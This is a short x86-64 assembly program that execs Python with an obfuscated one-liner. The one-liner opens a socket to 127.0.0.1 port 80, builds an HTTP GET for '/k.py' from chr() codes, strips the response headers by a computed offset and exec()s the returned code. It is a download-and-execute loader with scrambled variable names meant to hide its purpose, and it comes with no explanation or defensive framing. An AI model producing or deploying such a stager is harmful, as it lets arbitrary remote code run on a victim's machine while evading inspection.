section .data
        file db "/bin/python",0
        arg0 db '-c'
        arg1 db "import os;import socket;asdadfas = socket.socket(socket.AF_INET, socket.SOCK_STREAM);xdvx = '127.0.0.1';zfsdk = ord('P');asdadfas.connect((xdvx,zfsdk));sfbaskjsasdhff = chr(71)+chr(69)+chr(84)+chr(32)+chr(47)+chr(107)+'.py HTTP/1.1\r\nHost:localhost\r\n\r\n';asdadfas.send(sfbaskjsasdhff.encode());sfjsdgasdfhj = asdadfas.recv(1024);sdfgsdfsudyf = sfjsdgasdfhj[ord('T')+ord('A')+ord('B')+12:];exec(sdfgsdfsudyf)"
        arguments dq file,arg0,arg1,0
section .text
global _start:
_start:
    mov rax,59
    mov rdi,file
    mov rsi,arguments
    mov rdx,0
    syscall
    mov rax,60
    mov rdi,0
    syscall
